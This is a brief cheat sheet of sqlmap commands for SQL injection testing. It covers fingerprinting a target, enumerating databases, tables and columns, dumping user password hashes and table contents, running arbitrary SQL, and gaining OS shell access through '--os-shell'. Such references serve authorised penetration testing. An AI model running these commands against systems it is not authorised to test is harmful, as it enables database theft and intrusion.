# Test URL and POST data and return database banner (if possible)
./sqlmap.py --url="<url>" --data="<post-data>" --banner

# Parse request data and test | request data can be obtained with burp
./sqlmap.py -r <request-file> <options>

# Fingerprint | much more information than banner
./sqlmap.py -r <request-file> --fingerprint

# Get database username, name, and hostname
./sqlmap.py -r <request-file> --current-user --current-db --hostname

# Check if user is a database admin
./sqlmap.py -r <request-file> --is-dba

# Get database users and password hashes
./sqlmap.py -r <request-file> --users --passwords

# Enumerate databases
./sqlmap.py -r <request-file> --dbs

# List tables for one database
./sqlmap.py -r <request-file> -D <db-name> --tables

# Other database commands
./sqlmap.py -r <request-file> -D <db-name> --columns
                                           --schema
                                           --count
# Enumeration flags
./sqlmap.py -r <request-file> -D <db-name>
                              -T <tbl-name>
                              -C <col-name>
                              -U <user-name>

# Extract data
./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump

# Execute SQL Query
./sqlmap.py -r <request-file> --sql-query="<sql-query>"

# Append/Prepend SQL Queries
./sqlmap.py -r <request-file> --prefix="<sql-query>" --suffix="<sql-query>"

# Get backdoor access to sql server | can give shell access
./sqlmap.py -r <request-file> --os-shell
